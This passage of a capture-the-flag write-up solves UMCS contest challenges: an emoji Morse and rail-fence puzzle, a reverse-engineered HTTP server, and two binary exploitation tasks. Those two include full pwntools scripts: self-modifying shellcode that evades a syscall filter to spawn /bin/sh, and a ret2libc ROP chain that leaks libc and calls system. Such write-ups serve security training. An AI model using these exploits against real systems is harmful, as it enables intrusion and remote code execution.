<a class=link href=https://gist.github.com/umcybersec/55bb6b18159083cf811de96d8fef1583 target=_blank rel=noopener>https://gist.github.com/umcybersec/55bb6b18159083cf811de96d8fef1583</a></p><p>gist_of_samuel.txt :</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>🚂🚂🚂🚂🚆🚂🚆🚂🚋🚂🚆🚂🚆🚂🚂🚂🚂🚂🚂🚂🚆🚂🚂🚆🚂🚂🚂🚆🚂🚂🚂🚂🚂🚂🚂🚆🚋🚂🚋🚋🚆🚋🚋🚋🚆🚂🚂🚋🚆🚂🚋🚂🚆🚂🚂🚂🚂🚂🚂🚂🚆🚂🚋🚋🚂🚆🚂🚋🚂🚆🚂🚂🚆🚋🚋🚂🚂🚆🚂🚆🚂🚂🚂🚂🚂🚂🚂🚆🚂🚆🚋🚋🚋🚋🚋🚆🚂🚋🚋🚋🚋🚆🚂🚂🚋🚋🚋🚆🚋🚂🚂🚆🚋🚋🚋🚋🚋🚆🚂🚋🚆🚂🚋🚋🚋🚋🚆🚂🚂🚋🚂🚆🚂🚂🚋🚂🚆🚂🚂🚋🚂🚆🚂🚋🚆🚋🚂🚋🚂🚆🚂🚂🚂🚂🚋🚆🚂🚂🚋🚋🚋🚆🚋🚂🚂🚆🚋🚂🚂🚂🚂🚆🚂🚋🚆🚂🚋🚆🚂🚆🚋🚋🚋🚋🚋🚆🚋🚋🚋🚋🚋🚆🚋🚂🚋🚂🚆🚂🚂🚂🚂🚂🚆🚂🚂🚂🚂🚋🚆🚋🚋🚋🚋🚋🚆🚋🚋🚂🚂🚂🚆🚋🚋🚋🚂🚂🚆🚂🚋🚆🚋🚂🚂🚆🚂🚂🚂🚋🚋🚆🚂🚆🚂🚂🚂🚂🚂🚂🚂🚆🚂🚂🚂🚆🚂🚋🚆🚋🚋🚆🚂🚂🚋🚆🚂🚆🚂🚋🚂🚂🚆🚂🚂🚂🚂🚂🚂🚂🚆🚂🚋🚂🚆🚂🚆🚂🚋🚆🚂🚋🚂🚂🚆🚂🚋🚂🚂🚆🚋🚂🚋🚋🚆🚂🚂🚂🚂🚂🚂🚂🚆🚂🚋🚂🚂🚆🚂🚂🚆🚋🚂🚋🚆🚂🚆🚂🚂🚂🚆🚂🚂🚂🚂🚂🚂🚂🚆🚋🚆🚂🚋🚂🚆🚂🚋🚆🚂🚂🚆🚋🚂🚆🚋🚋🚂🚂🚋🚋🚆🚂🚂🚂🚂🚂🚂🚂🚆🚂🚋🚆🚋🚂🚆🚋🚂🚂🚆🚂🚂🚂🚂🚂🚂🚂🚆🚂🚂🚂🚂🚆🚂🚂🚆🚂🚂🚂🚆🚂🚂🚂🚂🚂🚂🚂🚆🚂🚂🚋🚂🚆🚂🚋🚆🚂🚂🚂🚋🚆🚋🚋🚋🚆🚂🚋🚂🚆🚂🚂🚆🚋🚆🚂🚆🚂🚂🚂🚂🚂🚂🚂🚆🚋🚂🚆🚂🚂🚋🚆🚋🚋🚆🚋🚂🚂🚂🚆🚂🚆🚂🚋🚂🚆🚂🚂🚂🚂🚂🚂🚂🚆🚂🚂🚆🚂🚂🚂🚆🚂🚂🚂🚂🚂🚂🚂🚆🚋🚋🚋🚂🚂
</span></span></code></pre></td></tr></table></div></div><p>Based on this sequence, I assume it is morse code where<br>🚂 represents &rsquo; <strong>.</strong> &rsquo;<br>🚋 represents &rsquo; <strong>-</strong> &rsquo;<br>🚆 represents &rsquo; <strong>space</strong> '</p><p>So when decode it, the output is:<br><code>HERE.......IS.......YOUR.......PRIZE.......E012D0A1FFFAC42D6AAE00C54078AD3E.......SAMUEL.......REALLY.......LIKES.......TRAIN,.......AND.......HIS.......FAVORITE.......NUMBER.......IS.......8</code></p><p>After consulting ChatGPT, getting know that E012D0A1FFFAC42D6AAE00C54078AD3E is a hash number, meanwhile combining with the hint given, the URL link is then replaced with this hash number.<br><img src=/p/umcsctf-writeup/image13.png width=940 height=354 srcset="/p/umcsctf-writeup/image13_hu37bc56ae25c8f92b60e86190df47511d_122254_480x0_resize_box_3.png 480w, /p/umcsctf-writeup/image13_hu37bc56ae25c8f92b60e86190df47511d_122254_1024x0_resize_box_3.png 1024w" loading=lazy class=gallery-image data-flex-grow=265 data-flex-basis=637px><br>Again, we get these unreadable blocks. At first, I thought it would be ciphertext that needed to be decrypted to get the plaintext by using <a class=link href=https://lingojam.com/%E2%96%88%E2%96%88%E2%96%88%E2%96%88Translator target=_blank rel=noopener>Lingojam</a> but it shows more unreadable characters as shown below.<br><img src=/p/umcsctf-writeup/image14.png width=771 height=399 srcset="/p/umcsctf-writeup/image14_hua9daed7b5c97e6d617a29f36ec47d577_214137_480x0_resize_box_3.png 480w, /p/umcsctf-writeup/image14_hua9daed7b5c97e6d617a29f36ec47d577_214137_1024x0_resize_box_3.png 1024w" loading=lazy class=gallery-image data-flex-grow=193 data-flex-basis=463px></p><p>Well, it was too overthinking, let’s go back to the clues given: <code>SAMUEL.......REALLY.......LIKES.......TRAIN,.......AND.......HIS.......FAVORITE.......NUMBER.......IS.......8.</code> After searching, the only decryption method named <a class=link href=https://www.dcode.fr/rail-fence-cipher target=_blank rel=noopener>Rail Fence (Zig-Zag) Cipher</a> is related to trains. Therefore, after decrypting it by using key=8, we will get the rearranged blocks. Download the decrypted blocks in the notepad and adjust the widget until it shows the text below: WILLOWTREECAMPSITE.<br><strong><img src=/p/umcsctf-writeup/image15.png width=602 height=101 srcset="/p/umcsctf-writeup/image15_hu09a3819594864f10ec034ecffa76b04b_44436_480x0_resize_box_3.png 480w, /p/umcsctf-writeup/image15_hu09a3819594864f10ec034ecffa76b04b_44436_1024x0_resize_box_3.png 1024w" loading=lazy class=gallery-image data-flex-grow=596 data-flex-basis=1430px></strong><br>Flag: umcs{willow_tree_campsite}</p><h2 id=pwn-babysc><strong>PWN: Babysc</strong></h2><p><a class=link href=https://github.com/umcybersec/umcs_preliminary/tree/main/pwn-babysc target=_blank rel=noopener>https://github.com/umcybersec/umcs_preliminary/tree/main/pwn-babysc</a></p><p><strong><img src=/p/umcsctf-writeup/image16.png width=940 height=519 srcset="/p/umcsctf-writeup/image16_huc061c530e018d746b62d6caed4df1d51_110509_480x0_resize_box_3.png 480w, /p/umcsctf-writeup/image16_huc061c530e018d746b62d6caed4df1d51_110509_1024x0_resize_box_3.png 1024w" loading=lazy class=gallery-image data-flex-grow=181 data-flex-basis=434px></strong></p><p>From the source code given, the <code>vuln()</code> function shows that it reads 4096 bytes from the input and checks the bad code received which are <code>0x80cd</code> (int 0x80), <code>0x340f</code> (sysenter), and <code>0x050f</code> (syscall) to prevent syscall and executes from the input. So I am using the <a class=link href=https://github.com/Gallopsled/pwntools target=_blank rel=noopener>pwntools</a> library given from the online to make it easily implement my binary exploitation. Lastly, the python script is on the below:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span><span class=lnt>20
</span><span class=lnt>21
</span><span class=lnt>22
</span><span class=lnt>23
</span><span class=lnt>24
</span><span class=lnt>25
</span><span class=lnt>26
</span><span class=lnt>27
</span><span class=lnt>28
</span><span class=lnt>29
</span><span class=lnt>30
</span><span class=lnt>31
</span><span class=lnt>32
</span><span class=lnt>33
</span><span class=lnt>34
</span><span class=lnt>35
</span><span class=lnt>36
</span><span class=lnt>37
</span><span class=lnt>38
</span><span class=lnt>39
</span><span class=lnt>40
</span><span class=lnt>41
</span><span class=lnt>42
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=kn>from</span> <span class=nn>pwn</span> <span class=kn>import</span> <span class=o>*</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>exe</span> <span class=o>=</span> <span class=s1>&#39;./babysc&#39;</span>
</span></span><span class=line><span class=cl><span class=n>elf</span> <span class=o>=</span> <span class=n>context</span><span class=o>.</span><span class=n>binary</span> <span class=o>=</span> <span class=n>ELF</span><span class=p>(</span><span class=n>exe</span><span class=p>,</span> <span class=n>checksec</span><span class=o>=</span><span class=kc>True</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=c1>#context.log_level = &#39;DEBUG&#39;</span>
</span></span><span class=line><span class=cl><span class=n>context</span><span class=o>.</span><span class=n>arch</span><span class=o>=</span><span class=s1>&#39;amd64&#39;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>sh</span> <span class=o>=</span> <span class=n>remote</span><span class=p>(</span><span class=s1>&#39;34.133.69.112&#39;</span><span class=p>,</span> <span class=mi>10001</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=c1>#sh = process(exe)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>forbidden_pairs</span> <span class=o>=</span> <span class=p>[</span><span class=sa>b</span><span class=s1>&#39;</span><span class=se>\x0f\x05</span><span class=s1>&#39;</span><span class=p>,</span> <span class=sa>b</span><span class=s1>&#39;</span><span class=se>\x0f\x34</span><span class=s1>&#39;</span><span class=p>,</span> <span class=sa>b</span><span class=s1>&#39;</span><span class=se>\xcd\x80</span><span class=s1>&#39;</span><span class=p>]</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>shellcode</span> <span class=o>=</span> <span class=s1>&#39;&#39;&#39;
</span></span></span><span class=line><span class=cl><span class=s1>    /* Get address of placeholder using GAS RIP-relative syntax */
</span></span></span><span class=line><span class=cl><span class=s1>    lea rbx, [rip + placeholder]
</span></span></span><span class=line><span class=cl><span class=s1>    /* Write forbidden syscall bytes DYNAMICALLY (0x0f 0x05) */
</span></span></span><span class=line><span class=cl><span class=s1>    mov byte ptr [rbx], 0x0f
</span></span></span><span class=line><span class=cl><span class=s1>    mov byte ptr [rbx + 1], 0x05
</span></span></span><span class=line><span class=cl><span class=s1>    /* Set up execve(&#34;/bin/sh&#34;, 0, 0) */
</span></span></span><span class=line><span class=cl><span class=s1>    xor rsi, rsi
</span></span></span><span class=line><span class=cl><span class=s1>    push rsi
</span></span></span><span class=line><span class=cl><span class=s1>    mov rdi, 0x68732f2f6e69622f  /* /bin//sh */
</span></span></span><span class=line><span class=cl><span class=s1>    push rdi
</span></span></span><span class=line><span class=cl><span class=s1>    mov rdi, rsp
</span></span></span><span class=line><span class=cl><span class=s1>    xor rdx, rdx
</span></span></span><span class=line><span class=cl><span class=s1>    mov eax, 0x3b               /* execve syscall number */
</span></span></span><span class=line><span class=cl><span class=s1>    jmp rbx                     /* Jump to modified code */
</span></span></span><span class=line><span class=cl><span class=s1>placeholder:
</span></span></span><span class=line><span class=cl><span class=s1>    .byte 0x90, 0x90            /* Placeholder for syscall */  
</span></span></span><span class=line><span class=cl><span class=s1>&#39;&#39;&#39;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>sc</span> <span class=o>=</span> <span class=n>asm</span><span class=p>(</span><span class=n>shellcode</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>for</span> <span class=n>i</span> <span class=ow>in</span> <span class=nb>range</span><span class=p>(</span><span class=nb>len</span><span class=p>(</span><span class=n>sc</span><span class=p>)</span> <span class=o>-</span> <span class=mi>1</span><span class=p>):</span>
</span></span><span class=line><span class=cl>    <span class=n>pair</span> <span class=o>=</span> <span class=n>shellcode</span><span class=p>[</span><span class=n>i</span><span class=p>:</span><span class=n>i</span><span class=o>+</span><span class=mi>2</span><span class=p>]</span>  
</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=n>pair</span> <span class=ow>in</span> <span class=n>forbidden_pairs</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=nb>print</span><span class=p>(</span><span class=sa>f</span><span class=s1>&#39;BAD BYTE --&gt; 0x</span><span class=si>{</span><span class=n>byte</span><span class=si>:</span><span class=s1>02x</span><span class=si>}</span><span class=s1>&#39;</span><span class=p>)</span>  
</span></span><span class=line><span class=cl>        <span class=nb>print</span><span class=p>(</span><span class=sa>f</span><span class=s1>&#39;ASCII --&gt; </span><span class=si>{</span><span class=nb>chr</span><span class=p>(</span><span class=n>byte</span><span class=p>)</span><span class=si>}</span><span class=s1>&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>sh</span><span class=o>.</span><span class=n>recvline</span><span class=p>()</span>
</span></span><span class=line><span class=cl><span class=n>sh</span><span class=o>.</span><span class=n>sendline</span><span class=p>(</span><span class=n>sc</span><span class=o>.</span><span class=n>ljust</span><span class=p>(</span><span class=mh>0x1000</span><span class=p>,</span> <span class=sa>b</span><span class=s1>&#39;</span><span class=se>\x90</span><span class=s1>&#39;</span><span class=p>))</span>
</span></span><span class=line><span class=cl><span class=n>sh</span><span class=o>.</span><span class=n>interactive</span><span class=p>()</span>
</span></span></code></pre></td></tr></table></div></div><p>The shellcode given to the binary will:</p><ol><li>Calculate the address of the placeholder at runtime</li><li>Write the forbidden syscall bytes dynamically</li><li>Execute /bin/sh using the execve syscall</li></ol><p>After that, I execute the python script I successfully enter to the instance given then I use <code>cat /flag</code> (based on the Dockerfile given) to get the flag content. Boom flag found.</p><p><img src=/p/umcsctf-writeup/image17.png width=940 height=601 srcset="/p/umcsctf-writeup/image17_hu91ef5e63e6f5513188d0c82f0ed0ed6f_350563_480x0_resize_box_3.png 480w, /p/umcsctf-writeup/image17_hu91ef5e63e6f5513188d0c82f0ed0ed6f_350563_1024x0_resize_box_3.png 1024w" loading=lazy class=gallery-image data-flex-grow=156 data-flex-basis=375px></p><p>Flag: umcs{shellcoding_78b18b51641a3d8ea260e91d7d05295a}</p><h2 id=pwn-liveleak><strong>PWN: Liveleak</strong></h2><p>From this question, I found the given “libc” library and “ld” library so I found the online tool called “<a class=link href=https://github.com/io12/pwninit target=_blank rel=noopener>pwninit</a>” to patch the given binary to make the binary run using the given “libc” library. Then, I try to decompile the binary to understand the source code.</p><p><img src=/p/umcsctf-writeup/image18.png width=244 height=237 srcset="/p/umcsctf-writeup/image18_hu6aa5ef19f74f58166a706cfb271144b8_4375_480x0_resize_box_3.png 480w, /p/umcsctf-writeup/image18_hu6aa5ef19f74f58166a706cfb271144b8_4375_1024x0_resize_box_3.png 1024w" loading=lazy class=gallery-image data-flex-grow=102 data-flex-basis=247px><br>Content of <code>main</code> function</p><p><img src=/p/umcsctf-writeup/image19.png width=277 height=229 srcset="/p/umcsctf-writeup/image19_hu79ff9412d17174cba16c59cbdd6aeded_4970_480x0_resize_box_3.png 480w, /p/umcsctf-writeup/image19_hu79ff9412d17174cba16c59cbdd6aeded_4970_1024x0_resize_box_3.png 1024w" loading=lazy class=gallery-image data-flex-grow=120 data-flex-basis=290px><br>Content of <code>vuln</code> function</p><p>Notice that, inside <code>vuln()</code> function it contains the vulnerability for buffer overflow attack because of using <code>fgets()</code> function but the size does not fit into the declared variable. So write the python script for the exploitation.</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span><span class=lnt>20
</span><span class=lnt>21
</span><span class=lnt>22
</span><span class=lnt>23
</span><span class=lnt>24
</span><span class=lnt>25
</span><span class=lnt>26
</span><span class=lnt>27
</span><span class=lnt>28
</span><span class=lnt>29
</span><span class=lnt>30
</span><span class=lnt>31
</span><span class=lnt>32
</span><span class=lnt>33
</span><span class=lnt>34
</span><span class=lnt>35
</span><span class=lnt>36
</span><span class=lnt>37
</span><span class=lnt>38
</span><span class=lnt>39
</span><span class=lnt>40
</span><span class=lnt>41
</span><span class=lnt>42
</span><span class=lnt>43
</span><span class=lnt>44
</span><span class=lnt>45
</span><span class=lnt>46
</span><span class=lnt>47
</span><span class=lnt>48
</span><span class=lnt>49
</span><span class=lnt>50
</span><span class=lnt>51
</span><span class=lnt>52
</span><span class=lnt>53
</span><span class=lnt>54
</span><span class=lnt>55
</span><span class=lnt>56
</span><span class=lnt>57
</span><span class=lnt>58
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=kn>from</span> <span class=nn>pwn</span> <span class=kn>import</span> <span class=o>*</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>exe</span> <span class=o>=</span> <span class=n>ELF</span><span class=p>(</span><span class=s2>&#34;./chall_patched&#34;</span><span class=p>)</span>  
</span></span><span class=line><span class=cl><span class=n>libc</span> <span class=o>=</span> <span class=n>ELF</span><span class=p>(</span><span class=s2>&#34;./libc.so.6&#34;</span><span class=p>)</span>  
</span></span><span class=line><span class=cl><span class=n>rop</span> <span class=o>=</span> <span class=n>ROP</span><span class=p>(</span><span class=n>exe</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>context</span><span class=o>.</span><span class=n>binary</span> <span class=o>=</span> <span class=n>exe</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>pop_rdi</span> <span class=o>=</span> <span class=n>rop</span><span class=o>.</span><span class=n>find_gadget</span><span class=p>([</span><span class=s2>&#34;pop rdi&#34;</span><span class=p>])[</span><span class=mi>0</span><span class=p>]</span>  
</span></span><span class=line><span class=cl><span class=n>ret</span> <span class=o>=</span> <span class=n>rop</span><span class=o>.</span><span class=n>find_gadget</span><span class=p>([</span><span class=s2>&#34;ret&#34;</span><span class=p>])[</span><span class=mi>0</span><span class=p>]</span>  
</span></span><span class=line><span class=cl><span class=n>puts_got</span> <span class=o>=</span> <span class=n>exe</span><span class=o>.</span><span class=n>got</span><span class=o>.</span><span class=n>puts</span>  
</span></span><span class=line><span class=cl><span class=n>puts_plt</span> <span class=o>=</span> <span class=n>exe</span><span class=o>.</span><span class=n>plt</span><span class=o>.</span><span class=n>puts</span>  
</span></span><span class=line><span class=cl><span class=n>vuln</span> <span class=o>=</span> <span class=n>exe</span><span class=o>.</span><span class=n>symbols</span><span class=o>.</span><span class=n>vuln</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>conn</span><span class=p>():</span>
</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=n>args</span><span class=o>.</span><span class=n>LOCAL</span><span class=p>:</span>  
</span></span><span class=line><span class=cl>        <span class=k>return</span> <span class=n>gdb</span><span class=o>.</span><span class=n>debug</span><span class=p>([</span><span class=n>exe</span><span class=o>.</span><span class=n>path</span><span class=p>])</span> 
</span></span><span class=line><span class=cl>    <span class=k>else</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=k>return</span> <span class=n>remote</span><span class=p>(</span><span class=s2>&#34;34.133.69.112&#34;</span><span class=p>,</span> <span class=mi>10007</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>main</span><span class=p>():</span>  
</span></span><span class=line><span class=cl>    <span class=n>r</span> <span class=o>=</span> <span class=n>conn</span><span class=p>()</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=c1># Leak puts@got.plt`  </span>
</span></span><span class=line><span class=cl>    <span class=n>r</span><span class=o>.</span><span class=n>recvuntil</span><span class=p>(</span><span class=sa>b</span><span class=s2>&#34;Enter your input: </span><span class=se>\n</span><span class=s2>&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>payload</span> <span class=o>=</span> <span class=n>flat</span><span class=p>(</span>
</span></span><span class=line><span class=cl>        <span class=sa>b</span><span class=s1>&#39;A&#39;</span> <span class=o>*</span> <span class=mi>72</span><span class=p>,</span>      <span class=c1># Overflow buffer (64) + RBP (8)  </span>
</span></span><span class=line><span class=cl>        <span class=n>pop_rdi</span><span class=p>,</span>        <span class=c1># (1st argument for `puts`)   </span>
</span></span><span class=line><span class=cl>        <span class=n>puts_got</span><span class=p>,</span>       <span class=c1># Address of `puts` in GOT (to leak)  </span>
</span></span><span class=line><span class=cl>        <span class=n>puts_plt</span><span class=p>,</span>       <span class=c1># Call `puts` to print the leaked address  </span>
</span></span><span class=line><span class=cl>        <span class=n>vuln</span><span class=p>,</span>           <span class=c1># Return to vuln() for second payload</span>
</span></span><span class=line><span class=cl>        <span class=n>p64</span><span class=p>(</span><span class=n>ret</span><span class=p>)</span> <span class=o>*</span> <span class=mi>3</span>    <span class=c1># Align stack for vuln() return</span>
</span></span><span class=line><span class=cl>    <span class=p>)[:</span><span class=mi>127</span><span class=p>]</span>             <span class=c1># Trim to 127 bytes (exclude NULL)  </span>
</span></span><span class=line><span class=cl>    <span class=n>r</span><span class=o>.</span><span class=n>send</span><span class=p>(</span><span class=n>payload</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=c1># Parse leaked address  </span>
</span></span><span class=line><span class=cl>    <span class=n>leaked_puts</span> <span class=o>=</span> <span class=n>u64</span><span class=p>(</span><span class=n>r</span><span class=o>.</span><span class=n>recvline</span><span class=p>()</span><span class=o>.</span><span class=n>strip</span><span class=p>()</span><span class=o>.</span><span class=n>ljust</span><span class=p>(</span><span class=mi>8</span><span class=p>,</span> <span class=sa>b</span><span class=s1>&#39;</span><span class=se>\x00</span><span class=s1>&#39;</span><span class=p>))</span>  
</span></span><span class=line><span class=cl>    <span class=n>libc</span><span class=o>.</span><span class=n>address</span> <span class=o>=</span> <span class=n>leaked_puts</span> <span class=o>-</span> <span class=n>libc</span><span class=o>.</span><span class=n>symbols</span><span class=o>.</span><span class=n>puts</span>  
</span></span><span class=line><span class=cl>    <span class=n>success</span><span class=p>(</span><span class=sa>f</span><span class=s2>&#34;Libc base: </span><span class=si>{</span><span class=nb>hex</span><span class=p>(</span><span class=n>libc</span><span class=o>.</span><span class=n>address</span><span class=p>)</span><span class=si>}</span><span class=s2>&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=c1># Send shell payload`  </span>
</span></span><span class=line><span class=cl>    <span class=n>r</span><span class=o>.</span><span class=n>recvuntil</span><span class=p>(</span><span class=sa>b</span><span class=s2>&#34;Enter your input: </span><span class=se>\n</span><span class=s2>&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>bin_sh</span> <span class=o>=</span> <span class=nb>next</span><span class=p>(</span><span class=n>libc</span><span class=o>.</span><span class=n>search</span><span class=p>(</span><span class=sa>b</span><span class=s2>&#34;/bin/sh</span><span class=se>\x00</span><span class=s2>&#34;</span><span class=p>))</span>  
</span></span><span class=line><span class=cl>    <span class=n>system</span> <span class=o>=</span> <span class=n>libc</span><span class=o>.</span><span class=n>symbols</span><span class=o>.</span><span class=n>system</span>  
</span></span><span class=line><span class=cl>    <span class=n>payload</span> <span class=o>=</span> <span class=n>flat</span><span class=p>(</span> 
</span></span><span class=line><span class=cl>        <span class=sa>b</span><span class=s1>&#39;A&#39;</span> <span class=o>*</span> <span class=mi>72</span><span class=p>,</span>  
</span></span><span class=line><span class=cl>        <span class=n>ret</span><span class=p>,</span>                <span class=c1># Align stack to 16 bytes (ABI requirement)`  </span>
</span></span><span class=line><span class=cl>        <span class=n>pop_rdi</span><span class=p>,</span>            <span class=c1># (1st argument for `system`)      </span>
</span></span><span class=line><span class=cl>        <span class=n>bin_sh</span><span class=p>,</span>             <span class=c1># Address of &#34;/bin/sh&#34; string in libc`  </span>
</span></span><span class=line><span class=cl>        <span class=n>system</span><span class=p>,</span>             <span class=c1># Call `system` ``  </span>
</span></span><span class=line><span class=cl>        <span class=n>p64</span><span class=p>(</span><span class=mh>0xdeadbeef</span><span class=p>)</span>     <span class=c1># Optional exit (not critical)`  </span>
</span></span><span class=line><span class=cl>    <span class=p>)[:</span><span class=mi>127</span><span class=p>]</span>                <span class=c1># Trim to 127 bytes`  </span>
</span></span><span class=line><span class=cl>    <span class=n>r</span><span class=o>.</span><span class=n>send</span><span class=p>(</span><span class=n>payload</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=n>r</span><span class=o>.</span><span class=n>interactive</span><span class=p>()</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>if</span> <span class=vm>__name__</span> <span class=o>==</span> <span class=s2>&#34;__main__&#34;</span><span class=p>:</span>  
</span></span><span class=line><span class=cl>    <span class=n>main</span><span class=p>()</span>
</span></span></code></pre></td></tr></table></div></div><p>The Script will:</p><ol><li>Leak Libc Address by using <code>puts</code> to print out the address of <code>puts</code> function and calculate it to find the <code>libc</code> base address</li><li>Execute <code>system("/bin/sh")</code> using leaked libc&rsquo;s address.</li></ol><p>After that, I execute the python script I successfully enter to the instance given then I use <code>cat /flag</code> (based on the Dockerfile given) to get the flag content. Boom flag found.</p><p><img src=/p/umcsctf-writeup/image20.png width=940 height=836 srcset="/p/umcsctf-writeup/image20_hu1aecfa07683e40fdfce52361bed85f87_475177_480x0_resize_box_3.png 480w, /p/umcsctf-writeup/image20_hu1aecfa07683e40fdfce52361bed85f87_475177_1024x0_resize_box_3.png 1024w" loading=lazy class=gallery-image data-flex-grow=112 data-flex-basis=269px><br><img src=/p/umcsctf-writeup/image21.png width=471 height=46 srcset="/p/umcsctf-writeup/image21_hu7fe11c099eb581402f54788f016a82b0_10526_480x0_resize_box_3.png 480w, /p/umcsctf-writeup/image21_hu7fe11c099eb581402f54788f016a82b0_10526_1024x0_resize_box_3.png 1024w" loading=lazy class=gallery-image data-flex-grow=1023 data-flex-basis=2457px></p><p>Flag: umcs{GOT_PLT_8f925fb19309045dac4db4572435441d}</p><h1 id=reverse-engineering-htpp-server><strong>Reverse Engineering: htpp-server</strong></h1><p>First I check if the given file belongs to which type using the <code>file</code> command.
<img src=/p/umcsctf-writeup/image-file.png width=940 height=56 srcset="/p/umcsctf-writeup/image-file_hu4384d1d37d3d3e2b02928dbf364a6055_72580_480x0_resize_box_3.png 480w, /p/umcsctf-writeup/image-file_hu4384d1d37d3d3e2b02928dbf364a6055_72580_1024x0_resize_box_3.png 1024w" loading=lazy class=gallery-image data-flex-grow=1678 data-flex-basis=4028px>
Notice that this is a ELF 64-bit executable file so I opened up with Ghidra to decompile it to view the source code.<br><img src=/p/umcsctf-writeup/image23.png width=940 height=300 srcset="/p/umcsctf-writeup/image23_hub072f38c807a20a9115d6d8808fc986a_64026_480x0_resize_box_3.png 480w, /p/umcsctf-writeup/image23_hub072f38c807a20a9115d6d8808fc986a_64026_1024x0_resize_box_3.png 1024w" loading=lazy class=gallery-image data-flex-grow=313 data-flex-basis=752px><br>Entry Function for the program<br><img src=/p/umcsctf-writeup/image24.png width=911 height=1043 srcset="/p/umcsctf-writeup/image24_hu7dc56f614498135e8e20b27139df0391_309671_480x0_resize_box_3.png 480w, /p/umcsctf-writeup/image24_hu7dc56f614498135e8e20b27139df0391_309671_1024x0_resize_box_3.png 1024w" loading=lazy class=gallery-image data-flex-grow=87 data-flex-basis=209px><br>Content of FUN_001013a9</p><p><strong><img src=/p/umcsctf-writeup/image25.png width=969 height=774 srcset="/p/umcsctf-writeup/image25_hu94a259d933785ae853ed3d7af7ed569e_191143_480x0_resize_box_3.png 480w, /p/umcsctf-writeup/image25_hu94a259d933785ae853ed3d7af7ed569e_191143_1024x0_resize_box_3.png 1024w" loading=lazy class=gallery-image data-flex-grow=125 data-flex-basis=300px></strong><br>Content of FUN_0010154b<br>The pictures above show that the program is started with the c runtime library and calling the main function which is <strong>FUN_001013a9</strong>. Then, I roughly viewed the code and found that the program listens to an 8080 port with a specific address and creates a subprocess to run the function named <strong>FUN_0010154b.</strong> After that, I found that the <strong>strstr()</strong> function is used to find the string input that contains “<strong>GET /goodshit/umcs_server HTTP/13.37</strong>”. Then I connect to the machine using the <code>nc</code> command and input the string given. Boom the flag will be shown.</p><p><img src=/p/umcsctf-writeup/image26.png width=556 height=234 srcset="/p/umcsctf-writeup/image26_hua0f1e6541eb3a490107ad903004d92c8_36331_480x0_resize_box_3.png 480w, /p/umcsctf-writeup/image26_hua0f1e6541eb3a490107ad903004d92c8_36331_1024x0_resize_box_3.png 1024w" loading=lazy class=gallery-image data-flex-grow=237 data-flex-basis=570px></p><p>umcs{http_server_a058712ff1da79c9bbf211907c65a5cd}</p><h2 id=web-microservices-solve-after-preliminary-round-end><strong>Web: Microservices （SOLVE AFTER PRELIMINARY ROUND END）</strong></h2><p><strong><img src=/p/umcsctf-writeup/image27.png width=494 height=502 srcset="/p/umcsctf-writeup/image27_hu6b3ee89c663ebe54c595a550e3e192ff_18959_480x0_resize_box_3.png 480w, /p/umcsctf-writeup/image27_hu6b3ee89c663ebe54c595a550e3e192ff_18959_1024x0_resize_box_3.png 1024w" loading=lazy class=gallery-image data-flex-grow=98 data-flex-basis=236px></strong></p><p><strong><img 